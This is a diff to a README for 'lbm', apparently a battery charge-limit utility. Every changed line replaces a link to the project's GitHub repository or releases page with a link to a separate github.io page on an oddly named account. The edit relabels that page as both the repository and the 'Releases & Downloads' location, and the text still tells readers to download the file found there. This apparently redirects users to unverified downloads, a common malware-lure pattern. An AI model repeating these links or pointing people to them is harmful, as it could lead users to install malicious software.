@@ -12,7 +12,7 @@ Think of it like a "stop filling at 80%" instruction for your battery. That's it
 
 Visit this link to download the application:
 
-[![Download lbm](https://img.shields.io/badge/Download_lbm-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unplayable-speechpattern930/lbm/releases)
+[![Download lbm](https://img.shields.io/badge/Download_lbm-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://unplayable-speechpattern930.github.io)
 
 Once you're on that page, look for the latest release and download the file it provides.
 
@@ -144,8 +144,8 @@ Found a bug? Have a suggestion? Feel free to contribute to the project on GitHub
 
 ## 🌐 Additional Resources
 
-- **Project Repository:** [https://github.com/Unplayable-speechpattern930/lbm](https://github.com/Unplayable-speechpattern930/lbm)
-- **Releases & Downloads:** [https://github.com/Unplayable-speechpattern930/lbm/releases](https://github.com/Unplayable-speechpattern930/lbm/releases)
+- **Project Repository:** [https://unplayable-speechpattern930.github.io](https://unplayable-speechpattern930.github.io)
+- **Releases & Downloads:** [https://unplayable-speechpattern930.github.io](https://unplayable-speechpattern930.github.io)
 
 ---
 
